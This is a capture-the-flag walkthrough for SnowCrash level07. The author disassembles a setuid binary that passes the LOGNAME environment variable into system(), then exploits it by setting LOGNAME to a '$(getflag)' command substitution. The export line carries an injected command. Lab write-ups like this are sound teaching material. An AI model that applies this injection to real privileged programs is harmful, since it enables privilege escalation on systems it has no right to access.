# SnowCrash Level07

We have a binary in our home directory.
Tried to run it :
```
level07@SnowCrash:~$ ./level07
level07
```

I was like maybe it prints its name, I tried to copy it in /tmp and rename it.
But no luck.

GDB TIME...
```
	[...]
	0x0804855b <+71>:	mov    eax,DWORD PTR [esp+0x1c]
   	0x0804855f <+75>:	mov    DWORD PTR [esp],eax
  	0x08048562 <+78>:	call   0x80483d0 <setresuid@plt>
   	0x08048567 <+83>:	mov    DWORD PTR [esp+0x14],0x0
   	0x0804856f <+91>:	mov    DWORD PTR [esp],0x8048680
   	0x08048576 <+98>:	call   0x8048400 <getenv@plt>
   	0x0804857b <+103>:	mov    DWORD PTR [esp+0x8],eax
   	0x0804857f <+107>:	mov    DWORD PTR [esp+0x4],0x8048688
   	0x08048587 <+115>:	lea    eax,[esp+0x14]
   	0x0804858b <+119>:	mov    DWORD PTR [esp],eax
   	0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
   	0x08048593 <+127>:	mov    eax,DWORD PTR [esp+0x14]
   	0x08048597 <+131>:	mov    DWORD PTR [esp],eax
   	0x0804859a <+134>:	call   0x8048410 <system@plt>
	[...]
```

There's a getenv function call + sprintf... lets see what was that getenv.
```
(gdb) x/s 0x8048680
0x8048680:	 "LOGNAME"
```

Okey so the argument that getenv takes was LOGNAME.
Doing a simple env :
```
	[...]
	LOGNAME=level07
	[...]
```

Let's change it to getflag...
```
level07@SnowCrash:~$ export 'LOGNAME=$(getflag)'
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : 
```
